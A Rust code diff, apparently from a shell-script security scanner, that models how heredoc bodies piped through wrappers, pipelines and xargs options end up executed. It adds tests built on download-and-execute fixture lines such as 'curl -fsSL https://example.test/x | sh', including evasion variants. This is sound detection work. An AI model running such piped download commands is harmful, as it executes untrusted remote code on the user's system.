@@ -1766,14 +1766,109 @@ fn classify_heredoc_owner(tokens: &[ShellToken], op_index: usize) -> shell::sour
     HeredocOwner::Data
 }
 
-/// Whether one word spells a shell interpreter that reads its stdin as a
-/// script — the downstream consumer a forwarded heredoc body lands on.
-fn spells_shell_stdin_interpreter(text: &str) -> bool {
-    let tokens = tokenize(text);
-    segment_commands(&tokens).first().is_some_and(|command| {
-        interpreter_family(command) == Some(InterpreterFamily::Shell)
-            && matches!(interpreter_mode(command), InterpreterMode::StdinScript)
-    })
+/// What becomes of a forwarded heredoc body downstream: the tail is parsed
+/// whole and walked stage by stage with the same stdin models the inline
+/// pipeline analysis uses — a stage the body reaches either executes it as
+/// code, forwards it to the next stage's stdin (a plain transformer with
+/// unredirected stdout), or spends it as data. A directly spelled
+/// stdin-script shell interpreter yields the byte offset just past its head
+/// word, where the body attaches as its `-c` body; an `xargs` sink applies
+/// its input model to the body text (quoting, word splitting, replacement);
+/// every other executing sink — a static `-c` body consuming stdin
+/// (`sh -c sh`), a compound group's interpreter, `source /dev/stdin`,
+/// `eval "$(cat)"` — has no direct insertion point and reports
+/// `ExecutedIndirectly` so the body's lines stay in the source. Data sinks
+/// and downstream modes that never read stdin as a script (`sh -n`,
+/// `sh -c body`, `sh script.sh`, `--help`) report `NotExecuted`.
+fn forwarded_body_fate(tail: &str, body: &str) -> shell::source::ForwardedBodyFate {
+    use shell::source::ForwardedBodyFate;
+    let tokens = tokenize(tail);
+    // The tail opens with the pipeline operator that carried the body out
+    // of the heredoc owner (`| sh`); the body enters its first stage.
+    let downstream = match tokens.split_first() {
+        Some((first, rest)) if matches!(first.operator(), Some("|" | "|&")) => rest,
+        _ => &tokens[..],
+    };
+    // Later list members (`| sh; rm …`, `| sh && more`) run with their own
+    // stdin; only the first statement carries the body.
+    let Some(&(statement, _)) = conditional_statements(downstream).first() else {
+        return ForwardedBodyFate::NotExecuted;
+    };
+    let segments = pipeline_segments(statement);
+    let mut budget = ShellBudget::new();
+    for (stage, segment) in segments.iter().enumerate() {
+        // The stage executes its inherited stdin as code: the sink.
+        if segment_stdin_reaches_interpreter(segment, &mut budget) {
+            return match sink_head(segment) {
+                // The body attaches as the interpreter's `-c` body.
+                Some((head_end, command))
+                    if interpreter_family(&command) == Some(InterpreterFamily::Shell)
+                        && matches!(interpreter_mode(&command), InterpreterMode::StdinScript) =>
+                {
+                    ForwardedBodyFate::AttachAt(head_end)
+                }
+                // xargs feeds its input to the wrapped command's argv: its
+                // own option, replacement, and input-field model decides
+                // which part of the body actually executes.
+                Some((_, command)) if command.head == "xargs" => xargs_body_fate(&command, body),
+                // Every other executing sink consumes the body verbatim as
+                // shell source.
+                Some(_) => ForwardedBodyFate::ExecutedIndirectly,
+                None => ForwardedBodyFate::ExecutedIndirectly,
+            };
+        }
+        // Anything else keeps the body alive only by passing it through to
+        // the next stage; walking off the end leaves it unexecuted.
+        if stage + 1 == segments.len() || !segment_stdout_preserved(segment, &mut budget) {
+            return ForwardedBodyFate::NotExecuted;
+        }
+    }
+    ForwardedBodyFate::NotExecuted
+}
+
+/// The sink stage's command chain, unwrapped through execution and
+/// privilege wrappers the way `segment_commands` does, with the final
+/// head's byte span and its command (`sudo -u root sh` yields `sh` after
+/// its span). `None` when the chain never lands on a word.
+fn sink_head(segment: &[ShellToken]) -> Option<(usize, ScriptCommand<'_>)> {
+    let mut index = 0usize;
+    skip_command_prefixes(segment, &mut index);
+    let (head, head_end) = loop {
+        let word = segment.get(index).and_then(ShellToken::word)?;
+        let basename = command_basename(word);
+        let span_end = segment[index].span()?.1;
+        if !matches!(
+            basename,
+            "sudo" | "pkexec" | "doas" | "command" | "env" | "exec" | "time"
+        ) {
+            break (basename, span_end);
+        }
+        index += 1;
+        // `env -S 'sh …'` word-splits its command string: no position in
+        // it can carry a mechanical rewrite.
+        if basename == "env" && env_split_string_command(segment, index).is_some() {
+            return None;
+        }
+        if !skip_wrapper_options(basename, segment, &mut index) {
+            return None; // options ran off the end: nothing is executed
+        }
+    };
+    // The command's own arguments end at the first non-redirection
+    // operator — a statement separator or group closer inside a compound
+    // (`(sh; cat)` leaves `cat` to the group, not to `sh`).
+    let args_end = segment[index + 1..]
+        .iter()
+        .position(|token| matches!(token, ShellToken::Operator(op) if !is_redirect_operator(op)))
+        .map_or(segment.len(), |offset| index + 1 + offset);
+    let arguments = command_arguments(&segment[..args_end], index + 1);
+    Some((
+        head_end,
+        ScriptCommand {
+            head,
+            args: arguments.iter().map(|(value, _)| *value).collect(),
+            arg_dynamic: arguments.iter().map(|(_, dynamic)| *dynamic).collect(),
+        },
+    ))
 }
 
 fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
@@ -1814,11 +1909,7 @@ fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
             })
             .filter(|(_, line)| !line.is_empty())
             .collect(),
-        _ => shell_logical_units(
-            source,
-            &classify_heredoc_owner,
-            &spells_shell_stdin_interpreter,
-        ),
+        _ => shell_logical_units(source, &classify_heredoc_owner, &forwarded_body_fate),
     };
 
     for (number, line) in units {
@@ -3206,29 +3297,591 @@ fn xargs_feeds_stdin_code(command: &ScriptCommand) -> bool {
     true
 }
 
-/// The `-I`/`--replace` placeholder of this xargs invocation, when one is
-/// set before the wrapped command: xargs substitutes it with each input
-/// item wherever it appears in the initial arguments.
+/// The `-I`/`--replace` placeholder of this xargs invocation, when one
+/// survives to runtime: xargs substitutes it with each input item wherever
+/// it appears in the initial arguments. GNU xargs warns and honors the
+/// LAST of `-I`/`-L`/`-n`, so a later batch option overrides replacement
+/// (`-I{} -n2` drops it) and a later `-I` restores it. GNU `--replace`
+/// takes its value only after `=`; the bare form defaults to `{}`.
 fn xargs_placeholder(command: &ScriptCommand, wrapped: usize) -> Option<String> {
+    let mut placeholder: Option<String> = None;
     let mut index = 0usize;
     while index < wrapped {
-        let arg = command.args[index];
-        if let Some(mark) = arg.strip_prefix("-I") {
-            return (!mark.is_empty())
-                .then_some(mark.to_owned())
-                .or_else(|| command.args.get(index + 1).map(|value| value.to_string()));
-        }
-        if let Some(rest) = arg.strip_prefix("--replace") {
-            if let Some(value) = rest.strip_prefix('=') {
-                return (!value.is_empty()).then_some(value.to_owned());
+        let arg = &command.args[index];
+        if let Some(long) = arg.strip_prefix("--") {
+            match long.split('=').next().unwrap_or(long) {
+                "replace" => {
+                    placeholder = match long.split_once('=') {
+                        Some((_, value)) if !value.is_empty() => Some(value.to_owned()),
+                        // `--replace=` replaces nothing.
+                        Some(_) => None,
+                        None => Some("{}".to_owned()),
+                    };
+                }
+                "max-args" | "max-lines" => placeholder = None,
+                _ => {}
             }
-            if rest.is_empty() {
-                return command.args.get(index + 1).map(|value| value.to_string());
+        } else if arg.len() > 1 && arg.starts_with('-') {
+            match arg.as_bytes()[1] {
+                b'I' => {
+                    placeholder = if arg.len() > 2 {
+                        Some(arg[2..].to_owned())
+                    } else {
+                        command.args.get(index + 1).map(|value| value.to_string())
+                    };
+                }
+                b'n' | b'L' => placeholder = None,
+                _ => {}
             }
         }
         index += 1;
     }
-    None
+    placeholder
+}
+
+/// The fate of a heredoc body fed through an `xargs` sink. xargs parses its
+/// input into items (honoring quotes and backslashes; line-based under
+/// `-I`/`-L`, whole-text under `-0`/`-d`) and appends the items to the
+/// wrapped command's argv — so the body text does NOT run verbatim as shell
+/// source. The existing option, replacement, and input-field model decides
+/// where the items land: a body-less `-c` gives the FIRST item of every
+/// invocation batch its own command body (the batch's remaining items are
+/// positional parameters), a `-I` placeholder reaching a code position
+/// takes every item, and every other position — the executed script file,
+/// data operands — never runs the body text.
+fn xargs_body_fate(command: &ScriptCommand, body: &str) -> shell::source::ForwardedBodyFate {
+    use shell::source::ForwardedBodyFate;
+    let Some(landing) = xargs_landing(command) else {
+        return ForwardedBodyFate::NotExecuted;
+    };
+    // The items that execute as `-c` bodies, each with the body line it
+    // starts on.
+    let executed: Vec<XargsItem> = match landing.sink {
+        // `-I`: every input line replaces the placeholder and executes.
+        XargsSink::PlaceholderCode => xargs_line_items(body),
+        XargsSink::BatchBodies => match &landing.items {
+            // Default: the whole input is one invocation, so only its
+            // first item is the `-c` body; `-n N` repeats the invocation
+            // per N items, and every batch's first item executes.
+            XargsItems::Word { per_invocation } => {
+                let items = xargs_word_items(body);
+                match per_invocation {
+                    Some(n) => items
+                        .chunks(*n)
+                        .filter_map(|batch| batch.first().cloned())
+                        .collect(),
+                    None => items.into_iter().next().into_iter().collect(),
+                }
+            }
+            // `-L N`: N logical lines per invocation, each line still
+            // word-split — the invocation's first item is the body. `-I`
+            // (one whole line per invocation) is the N = 1 no-split case.
+            XargsItems::Lines {
+                split,
+                per_invocation,
+            } => xargs_logical_line_groups(body)
+                .chunks(*per_invocation)
+                .filter_map(|batch| {
+                    // The batch's first word item — blank lines in the
+                    // batch contribute none, so later lines can still
+                    // start the invocation.
+                    let mut first: Option<XargsItem> = None;
+                    'batch: for group in batch {
+                        for (line, text) in group {
+                            let items: Vec<XargsItem> = if *split {
+                                xargs_word_items(text)
+                            } else {
+                                vec![XargsItem {
+                                    line: 0,
+                                    text: xargs_strip_item_quotes(text),
+                                }]
+                            };
+                            if let Some(mut item) = items.into_iter().next() {
+                                item.line = *line;
+                                first = Some(item);
+                                break 'batch;
+                            }
+                        }
+                    }
+                    first
+                })
+                .collect(),
+            // `-0`/`-d`: no quote processing — the whole input is one
+            // item, or is split on the delimiter, and `-n N` still groups
+            // the items into repeated invocations with every batch's
+            // first item as the `-c` body.
+            XargsItems::Whole {
+                delimiter,
+                per_invocation,
+            } => {
+                let mut line = 0usize;
+                let items: Vec<XargsItem> = match delimiter.as_deref().filter(|d| !d.is_empty()) {
+                    Some(delimiter) => body
+                        .split(delimiter)
+                        .map(|part| {
+                            let item = XargsItem {
+                                line,
+                                text: part.to_owned(),
+                            };
+                            line += part.matches('\n').count();
+                            item
+                        })
+                        .collect(),
+                    None => vec![XargsItem {
+                        line: 0,
+                        text: body.to_owned(),
+                    }],
+                };
+                match per_invocation {
+                    Some(n) => items
+                        .chunks(*n)
+                        .filter_map(|batch| batch.first().cloned())
+                        .collect(),
+                    None => items.into_iter().next().into_iter().collect(),
+                }
+            }
+        },
+    };
+    if executed.is_empty() {
+        return ForwardedBodyFate::NotExecuted;
+    }
+    // Separate invocations run as separate statements; items starting on
+    // the same body line share that line, others keep their own.
+    let mut out = vec![String::new(); body.lines().count()];
+    for item in executed {
+        if let Some(slot) = out.get_mut(item.line) {
+            if slot.is_empty() {
+                *slot = item.text;
+            } else {
+                slot.push_str("; ");
+                slot.push_str(&item.text);
+            }
+        }
+    }
+    ForwardedBodyFate::ExecutedAsInput(out)
+}
+
+/// Where an xargs invocation puts its input, decided on its option area
+/// and the wrapped command's argv. `None` when the input never becomes
+/// code: a script operand pins the executed file, a static `-c` body
+/// without a placeholder treats items as positional parameters, and `-a`
+/// reads items from a file instead of stdin.
+fn xargs_landing(command: &ScriptCommand) -> Option<XargsLanding> {
+    let wrapped = xargs_wrapped_command(command)?;
+    let placeholder = xargs_placeholder(command, wrapped);
+    let mut landing = XargsLanding {
+        sink: XargsSink::BatchBodies,
+        items: XargsItems::Word {
+            per_invocation: None,
+        },
+    };
+    let mut index = 0usize;
+    while index < wrapped {
+        let arg = command.args[index];
+        let mut advance = 1usize;
+        if let Some(long) = arg.strip_prefix("--") {
+            let (name, glued) = long
+                .split_once('=')
+                .map(|(name, value)| (name, Some(value)))
+                .unwrap_or((long, None));
+            let value = || {
+                glued
+                    .map(str::to_owned)
+                    .or_else(|| command.args.get(index + 1).map(|v| v.to_string()))
+            };
+            match name {
+                "null" => landing.set_delimited(None),
+                "delimiter" => {
+                    landing.set_delimited(value());
+                    if glued.is_none() {
+                        advance = 2;
+                    }
+                }
+                // GNU `--replace[=STR]` takes its value only after `=`:
+                // the bare form defaults to `{}` and the next word is the
+                // wrapped command.
+                "replace" => {
+                    landing.items = XargsItems::Lines {
+                        split: false,
+                        per_invocation: 1,
+                    };
+                }
+                "max-args" => {
+                    if let Some(n) = value() {
+                        landing.set_word_batch(&n);
+                    }
+                    if glued.is_none() {
+                        advance = 2;
+                    }
+                }
+                "max-lines" => {
+                    if let Some(n) = value() {
+                        landing.set_line_batch(&n);
+                    }
+                    if glued.is_none() {
+                        advance = 2;
+                    }
+                }
+                "arg-file" => return None, // items come from a file, not stdin
+                _ => {}
+            }
+        } else if arg.len() > 1 && arg.starts_with('-') {
+            let flags = &arg[1..];
+            match flags.chars().next() {
+                Some('0') => landing.set_delimited(None),
+                Some('d') => {
+                    if let Some(glued) = flags.get(1..).filter(|rest| !rest.is_empty()) {
+                        landing.set_delimited(Some(glued.to_owned()));
+                    } else {
+                        landing.set_delimited(command.args.get(index + 1).map(|v| v.to_string()));
+                        advance = 2;
+                    }
+                }
+                Some('I') => {
+                    landing.items = XargsItems::Lines {
+                        split: false,
+                        per_invocation: 1,
+                    };
+                    if flags.len() == 1 {
+                        advance = 2; // the separate placeholder word
+                    }
+                }
+                Some('L') | Some('n') => {
+                    let count = if flags.len() == 1 {
+                        advance = 2;
+                        command.args.get(index + 1).map(|value| &**value)
+                    } else {
+                        Some(&flags[1..])
+                    };
+                    if let Some(count) = count {
+                        if flags.starts_with('L') {
+                            landing.set_line_batch(count);
+                        } else {
+                            landing.set_word_batch(count);
+                        }
+                    }
+                }
+                Some('a') => return None, // items come from a file, not stdin
+                _ => {}
+            }
+        }
+        index += advance;
+    }
+    // The wrapped command must be a shell interpreter, and the input must
+    // reach a code position: a body-less `-c` (the first item becomes the
+    // body) or a `-I` placeholder inside the static `-c` body.
+    let wrapped_command = ScriptCommand {
+        head: command_basename(command.args[wrapped]),
+        args: command.args[wrapped + 1..].to_vec(),
+        arg_dynamic: command.arg_dynamic[wrapped + 1..].to_vec(),
+    };
+    if interpreter_family(&wrapped_command) != Some(InterpreterFamily::Shell) {
+        return None;
+    }
+    let mut c_body: Option<&str> = None;
+    let mut c_requested = false;
+    let mut index = 0usize;
+    while let Some(arg) = wrapped_command.args.get(index) {
+        if *arg == "--" {
+            return None; // the input fills a script-file position
+        }
+        if !arg.starts_with('-') {
+            if !c_requested {
+                return None; // the input fills the executed script-file slot
+            }
+            return xargs_sink_kind(landing, c_body, placeholder.as_deref());
+        }
+        if is_short_option(arg, 'c') {
+            c_requested = true;
+            c_body = separate_cluster_value(&wrapped_command, index);
+        }
+        index += 1;
+    }
+    if c_requested {
+        return xargs_sink_kind(landing, c_body, placeholder.as_deref());
+    }
+    None // no `-c`: the first item becomes the executed script file
+}
+
+/// The sink kind for a `-c`-taking wrapped command: a body-less `-c` gives
+/// the first item of each invocation batch its own body; a static body
+/// takes the input only through a placeholder or positional parameters,
+/// and then every item executes.
+fn xargs_sink_kind(
+    mut landing: XargsLanding,
+    c_body: Option<&str>,
+    placeholder: Option<&str>,
+) -> Option<XargsLanding> {
+    match c_body {
+        None => Some(landing),
+        Some(body) if body_is_input_code(body, placeholder) => {
+            landing.sink = XargsSink::PlaceholderCode;
+            Some(landing)
+        }
+        Some(_) => None, // static body: items are positional parameters
+    }
+}
+
+/// The invocation model of one xargs run: where its input lands in the
+/// wrapped command and how the input text is cut into items per
+/// invocation.
+struct XargsLanding {
+    sink: XargsSink,
+    items: XargsItems,
+}
+
+/// Where the input items go inside the wrapped shell invocation.
+enum XargsSink {
+    /// A body-less `-c`: the first item of every invocation batch becomes
+    /// that invocation's command body.
+    BatchBodies,
+    /// A `-I` placeholder inside the static `-c` body: every item replaces
+    /// it and executes.
+    PlaceholderCode,
+}
+
+/// How the input text is cut into items, per the option area.
+enum XargsItems {
+    /// The default: quote-aware whitespace word-splitting over the whole
+    /// input; `-n N` runs N items per invocation.
+    Word { per_invocation: Option<usize> },
+    /// `-I`/`-L`: N logical lines per invocation (a line ending in blanks
+    /// continues onto the next). `-I` items are whole logical lines;
+    /// `-L` logical lines are still word-split.
+    Lines { split: bool, per_invocation: usize },
+    /// `-0`/`-d`: no quote processing; the whole input is one item, or is
+    /// split on the delimiter; `-n N` still groups the items into
+    /// repeated invocations.
+    Whole {
+        delimiter: Option<String>,
+        per_invocation: Option<usize>,
+    },
+}
+
+impl XargsLanding {
+    /// `-n N`: N items per invocation. GNU xargs warns and honors the
+    /// LAST of `-I`/`-L`/`-n`: over a line mode word batching replaces it,
+    /// while over word/delimiter modes it only retunes the batch size.
+    fn set_word_batch(&mut self, count: &str) {
+        let Ok(n) = count.parse::<usize>() else {
+            return;
+        };
+        match &mut self.items {
+            XargsItems::Word { per_invocation } | XargsItems::Whole { per_invocation, .. } => {
+                *per_invocation = Some(n.max(1));
+            }
+            XargsItems::Lines { .. } => {
+                self.items = XargsItems::Word {
+                    per_invocation: Some(n.max(1)),
+                };
+            }
+        }
+    }
+
+    /// `-L N`: N logical lines per invocation, each still word-split. The
+    /// last of `-I`/`-L`/`-n` wins, so this replaces any earlier mode.
+    fn set_line_batch(&mut self, count: &str) {
+        if let Ok(n) = count.parse::<usize>() {
+            self.items = XargsItems::Lines {
+                split: true,
+                per_invocation: n.max(1),
+            };
+        }
+    }
+
+    /// `-0`/`-d`: delimiter-driven item splitting. A `-n` given earlier
+    /// keeps grouping the (now delimiter-cut) items.
+    fn set_delimited(&mut self, delimiter: Option<String>) {
+        let per_invocation = match &self.items {
+            XargsItems::Word { per_invocation } | XargsItems::Whole { per_invocation, .. } => {
+                *per_invocation
+            }
+            XargsItems::Lines { .. } => None,
+        };
+        self.items = XargsItems::Whole {
+            delimiter,
+            per_invocation,
+        };
+    }
+}
+
+/// One xargs input item: its runtime text and the body line it starts on.
+#[derive(Clone)]
+struct XargsItem {
+    line: usize,
+    text: String,
+}
+
+/// Logical input lines of the body: a physical line ending in blanks
+/// continues onto the next one, so each group is one `-L` line. Blank
+/// lines are not counted — GNU `-L` batches NONBLANK lines, so a blank
+/// line neither fills a batch nor starts one unless a trailing-blank line
+/// logically continues onto it. Each entry keeps its starting physical
+/// line.
+fn xargs_logical_line_groups(body: &str) -> Vec<Vec<(usize, &str)>> {
+    let mut groups: Vec<Vec<(usize, &str)>> = Vec::new();
+    for (index, line) in body.lines().enumerate() {
+        let continues = groups.last().is_some_and(|group| {
+            group
+                .last()
+                .is_some_and(|(_, text)| text.ends_with([' ', '\t']))
+        });
+        if line.trim().is_empty() && !continues {
+            continue; // a blank line outside a continuation is not counted
+        }
+        match groups.last_mut() {
+            Some(group) if continues => {
+                group.push((index, line));
+            }
+            _ => groups.push(vec![(index, line)]),
+        }
+    }
+    groups
+}
+
+/// `-I` items: one whole logical line per item, quote-processed.
+fn xargs_line_items(body: &str) -> Vec<XargsItem> {
+    xargs_logical_line_groups(body)
+        .into_iter()
+        .map(|group| {
+            let line = group[0].0;
+            let merged = group
+                .into_iter()
+                .map(|(_, text)| text)
+                .collect::<Vec<_>>()
+                .join(" ");
+            XargsItem {
+                line,
+                text: xargs_strip_item_quotes(&merged),
+            }
+        })
+        .collect()
+}
+
+/// xargs input word-splitting: items end at unquoted blanks and newlines;
+/// `'…'` is literal, `"…"` honors `\"`/`\\` escapes, and `\c` quotes any
+/// character. Each item keeps the body line it starts on.
+fn xargs_word_items(body: &str) -> Vec<XargsItem> {
+    let mut items = Vec::new();
+    let mut item = String::new();
+    let mut started = false; // `''` is an item, an unquoted blank run is not
+    let mut quote: Option<char> = None;
+    let mut line = 0usize;
+    let mut characters = body.chars();
+    while let Some(character) = characters.next() {
+        match quote {
+            Some('\'') => {
+                if character == '\'' {
+                    quote = None;
+                } else {
+                    item.push(character);
+                }
+                started = true;
+            }
+            Some('"') => {
+                if character == '"' {
+                    quote = None;
+                } else if character == '\\' {
+                    match characters.next() {
+                        Some(escaped @ ('"' | '\\')) => item.push(escaped),
+                        Some(other) => {
+                            item.push('\\');
+                            item.push(other);
+                        }
+                        None => item.push('\\'),
+                    }
+                    started = true;
+                } else {
+                    item.push(character);
+                    started = true;
+                }
+            }
+            _ => match character {
+                ' ' | '\t' | '\r' => {
+                    if started {
+                        items.push(XargsItem {
+                            line,
+                            text: std::mem::take(&mut item),
+                        });
+                        started = false;
+                    }
+                }
+                '\n' => {
+                    if started {
+                        items.push(XargsItem {
+                            line,
+                            text: std::mem::take(&mut item),
+                        });
+                        started = false;
+                    }
+                    line += 1;
+                }
+                '\'' | '"' => {
+                    quote = Some(character);
+                    started = true;
+                }
+                '\\' => {
+                    started = true;
+                    match characters.next() {
+                        Some(escaped) => item.push(escaped),
+                        None => item.push('\\'),
+                    }
+                }
+                _ => {
+                    item.push(character);
+                    started = true;
+                }
+            },
+        }
+    }
+    if started {
+        items.push(XargsItem { line, text: item });
+    }
+    items
+}
+
+/// xargs quote processing over one input line (`-I`/`-L` items): quote
+/// characters are removed, escapes applied, blanks kept.
+fn xargs_strip_item_quotes(line: &str) -> String {
+    let mut item = String::new();
+    let mut quote: Option<char> = None;
+    let mut characters = line.chars();
+    while let Some(character) = characters.next() {
+        match quote {
+            Some('\'') => {
+                if character == '\'' {
+                    quote = None;
+                } else {
+                    item.push(character);
+                }
+            }
+            Some('"') => {
+                if character == '"' {
+                    quote = None;
+                } else if character == '\\' {
+                    match characters.next() {
+                        Some(escaped @ ('"' | '\\')) => item.push(escaped),
+                        Some(other) => {
+                            item.push('\\');
+                            item.push(other);
+                        }
+                        None => item.push('\\'),
+                    }
+                } else {
+                    item.push(character);
+                }
+            }
+            _ => match character {
+                '\'' | '"' => quote = Some(character),
+                '\\' => match characters.next() {
+                    Some(escaped) => item.push(escaped),
+                    None => item.push('\\'),
+                },
+                _ => item.push(character),
+            },
+        }
+    }
+    item
 }
 
 /// Whether a static `-c` body executes xargs input: through positional
@@ -3291,11 +3944,13 @@ fn xargs_wrapped_command(command: &ScriptCommand) -> Option<usize> {
             return Some(index);
         }
         let long = arg.strip_prefix("--");
+        // GNU `--replace[=STR]` takes its value only after `=` and never
+        // consumes the wrapped command; every other valued long option
+        // takes a separate value word.
         let takes_value = match long.map(|value| value.split('=').next().unwrap_or(value)) {
-            Some(
-                "replace" | "max-args" | "max-lines" | "max-procs" | "max-chars" | "eof"
-                | "delimiter",
-            ) => !arg.contains('='),
+            Some("max-args" | "max-lines" | "max-procs" | "max-chars" | "eof" | "delimiter") => {
+                !arg.contains('=')
+            }
             Some(_) => false,
             None => {
                 let short = &arg[1..];
@@ -6738,7 +7393,7 @@ var url = "https://example.test/x"
             shell_logical_units(
                 "true;# curl x | sh\nnext\n",
                 &classify_heredoc_owner,
-                &spells_shell_stdin_interpreter
+                &forwarded_body_fate
             ),
             vec![(1, "true;".to_owned()), (2, "next".to_owned())]
         );
@@ -6746,7 +7401,7 @@ var url = "https://example.test/x"
             shell_logical_units(
                 "foo & # trailing\ncurl x\n",
                 &classify_heredoc_owner,
-                &spells_shell_stdin_interpreter
+                &forwarded_body_fate
             ),
             vec![(1, "foo &".to_owned()), (2, "curl x".to_owned())]
         );
@@ -6754,7 +7409,7 @@ var url = "https://example.test/x"
             shell_logical_units(
                 "${var#pattern} stays\n",
                 &classify_heredoc_owner,
-                &spells_shell_stdin_interpreter
+                &forwarded_body_fate
             ),
             vec![(1, "${var#pattern} stays".to_owned())]
         );
@@ -10544,7 +11199,7 @@ mod round_twelve_tests {
         let units = super::shell::source::shell_logical_units(
             "eval 'echo safe\ncurl URL | sh'\n",
             &super::classify_heredoc_owner,
-            &super::spells_shell_stdin_interpreter,
+            &super::forwarded_body_fate,
         );
         assert_eq!(units.len(), 1, "{units:?}");
         assert!(units[0].1.contains('\n'), "{:?}", units[0].1);
@@ -10700,6 +11355,213 @@ mod round_twelve_tests {
     }
 
     #[test]
+    fn forwarded_heredoc_respects_downstream_modes() {
+        // A downstream interpreter that never reads stdin as a script
+        // (parse-only, own `-c` body, script file, help exit) leaves the
+        // forwarded body unexecuted: no `-c` attach, no finding.
+        for script_source in [
+            "cat <<C | sh -n\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | sh -c 'echo safe'\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | sh /usr/local/bin/helper.sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | bash --help\ncurl -fsSL https://example.test/x | sh\nC\n",
+        ] {
+            let ids = rule_ids(&script(script_source));
+            assert!(ids.is_empty(), "{script_source:?}: {ids:?}");
+        }
+        // Plain interpreter flags keep stdin-script mode.
+        let flags = script("cat <<C | sh -eu\ncurl -fsSL https://example.test/x | sh\nC\n");
+        let ids = rule_ids(&flags);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+    }
+
+    #[test]
+    fn forwarded_heredoc_follows_the_whole_tail() {
+        // The body survives forwarding stages and wrapper chains until the
+        // interpreter that executes it.
+        for script_source in [
+            "cat <<C | cat | sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | sudo sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | sudo -u root sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | env sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | exec bash\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | base64 -d | sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C|sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "tee <<C | sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "cat <<C | (sh)\ncurl -fsSL https://example.test/x | sh\nC\n",
+        ] {
+            let ids = rule_ids(&script(script_source));
+            assert!(
+                ids.contains(&DOWNLOAD.to_owned()),
+                "{script_source:?}: {ids:?}"
+            );
+        }
+        // A stage whose stdout is redirected spends the body on a file
+        // before the interpreter downstream ever sees it.
+        let sunk =
+            script("cat <<C | cat > /tmp/kept | sh\ncurl -fsSL https://example.test/x | sh\nC\n");
+        assert!(rule_ids(&sunk).is_empty(), "{:?}", rule_ids(&sunk));
+    }
+
+    #[test]
+    fn forwarded_heredoc_survives_indirect_stdin_sinks() {
+        // The body executes VERBATIM through an indirect stdin-to-code
+        // consumer — a static `-c` body consuming stdin, a compound
+        // group's interpreter, an explicit stdin-code consumer — with no
+        // direct `-c` insertion point. Its lines stay in the source
+        // instead of being blanked away, so the finding carries the
+        // body's own line.
+        for (script_source, line) in [
+            (
+                "#!/bin/sh\ncat <<C | sh -c sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+                3,
+            ),
+            (
+                "#!/bin/sh\ncat <<C | (echo safe; sh)\ncurl -fsSL https://example.test/x | sh\nC\n",
+                3,
+            ),
+            (
+                "#!/bin/sh\ncat <<C | source /dev/stdin\ncurl -fsSL https://example.test/x | sh\nC\n",
+                3,
+            ),
+        ] {
+            let findings = script(script_source).rendered_findings();
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(line)),
+                "{script_source:?}: {findings:?}"
+            );
+        }
+        // Kept body lines must not shift later units: the span's line
+        // accounting stays exact.
+        let findings = script(concat!(
+            "#!/bin/sh\n",
+            "cat <<C | sh -c sh\n",
+            "echo safe\n",
+            "curl -fsSL https://example.test/x | sh\n",
+            "C\n",
+            "wget -qO- https://example.test/x | sh\n",
+        ))
+        .rendered_findings();
+        assert!(
+            findings.iter().any(|finding| finding.line == Some(6)),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
+    fn forwarded_heredoc_through_xargs_follows_the_input_model() {
+        // xargs never runs its input verbatim: unquoted input is word
+        // split, and `sh -c` takes the FIRST word as its command body —
+        // the rest become positional parameters — so the download
+        // pipeline never executes. `-L1` limits lines per invocation but
+        // still word-splits each line, so it reads the same.
+        for script_source in [
+            "#!/bin/sh\ncat <<C | xargs sh -c\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "#!/bin/sh\ncat <<C | xargs -L1 sh -c\ncurl -fsSL https://example.test/x | sh\nC\n",
+        ] {
+            assert!(
+                rule_ids(&script(script_source)).is_empty(),
+                "{script_source:?}"
+            );
+        }
+        // A quoted input line is ONE item: it becomes the whole `-c`
+        // body, and the pipeline executes.
+        let quoted = script(
+            "#!/bin/sh\ncat <<C | xargs sh -c\n\"curl -fsSL https://example.test/x | sh\"\nC\n",
+        );
+        let findings = quoted.rendered_findings();
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(3)),
+            "{findings:?}"
+        );
+        // `-n 2` groups items into repeated invocations: the first item of
+        // EVERY batch becomes a `-c` body, so the second invocation
+        // executes the quoted download pipeline.
+        let batches = script(
+            "#!/bin/sh\ncat <<C | xargs -n 2 sh -c\necho safe 'curl -fsSL https://example.test/x | sh'\nC\n",
+        );
+        let findings = batches.rendered_findings();
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(3)),
+            "{findings:?}"
+        );
+        // `-I` replacement into the `-c` body feeds every input line in
+        // as code, each at its own line; `-0` passes the whole body as
+        // one unprocessed item.
+        for (script_source, line) in [
+            (
+                "#!/bin/sh\ncat <<C | xargs -I{} sh -c '{}'\ncurl -fsSL https://example.test/x | sh\nC\n",
+                3,
+            ),
+            (
+                "#!/bin/sh\ncat <<C | xargs -I{} sh -c '{}'\necho safe\ncurl -fsSL https://example.test/x | sh\nC\n",
+                4,
+            ),
+            (
+                "#!/bin/sh\ncat <<C | xargs -0 sh -c\ncurl -fsSL https://example.test/x | sh\nC\n",
+                3,
+            ),
+        ] {
+            let findings = script(script_source).rendered_findings();
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(line)),
+                "{script_source:?}: {findings:?}"
+            );
+        }
+        // Script-file and data positions never execute the body text.
+        for script_source in [
